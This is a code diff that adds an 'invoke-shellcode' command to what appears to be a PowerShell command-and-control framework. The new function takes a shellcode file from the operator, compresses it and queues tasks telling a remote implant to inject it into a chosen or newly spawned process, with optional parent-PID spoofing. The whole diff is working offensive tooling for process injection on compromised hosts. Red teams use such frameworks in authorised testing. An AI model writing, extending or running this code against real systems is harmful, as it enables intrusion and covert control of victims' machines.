@@ -850,6 +850,61 @@ def do_inject_shellcode(user, command, implant_id):
 
 
 @command(commands, commands_help, examples, block_help)
+def do_invoke_shellcode(user, command, implant_id):
+    """
+    Invoke shellcode into a target process, obtaining an implant in that process.
+
+    Prompts for the shellcode file to use.
+    Can either provide an executable to run and an optional parent PID to spoof,
+    or the PID of an already running process.
+
+    New processes can be created suspended to prevent execution if desired.
+
+    Examples:
+        invoke-shellcode -processid 5634
+    """
+    params = re.compile("invoke-shellcode", re.IGNORECASE)
+    params = params.sub("", command)
+    check_module_loaded("Invoke-Shellcode.ps1", implant_id, user)
+    session = PromptSession(history=FileHistory(f'{PoshProjectDirectory}/.shellcode-history'),
+                            auto_suggest=AutoSuggestFromHistory(), style=style)
+
+    try:
+        path = session.prompt("Location of shellcode file: ",
+                              completer=FilePathCompleter(PayloadsDirectory, glob="*.bin"))
+        path = PayloadsDirectory + path
+    except KeyboardInterrupt:
+        return
+
+    try:
+        shellcodefile = load_file(path)
+
+        if shellcodefile is not None:
+            arch = "64"
+            gzip_shellcode = gzipdata(shellcodefile)
+            cmd = f"$Shellcode{arch}=\"{gzip_shellcode}\" #{os.path.basename(path)}"
+            new_task = NewTask(
+                implant_id=implant_id,
+                command=cmd,
+                user=user,
+                child_implant_id=None
+            )
+
+            insert_object(new_task)
+            cmd = f"Invoke-Shellcode -Force -Shellcode (gzip-decompress($Shellcode{arch})){params}"
+            new_task = NewTask(
+                implant_id=implant_id,
+                command=cmd,
+                user=user,
+                child_implant_id=None
+            )
+
+            insert_object(new_task)
+    except Exception as e:
+        print_bad(f"Error loading file: {e}")
+
+
+@command(commands, commands_help, examples, block_help)
 def do_ps(user, command, implant_id):
     """
     Gets the process listing for current host, displaying more information
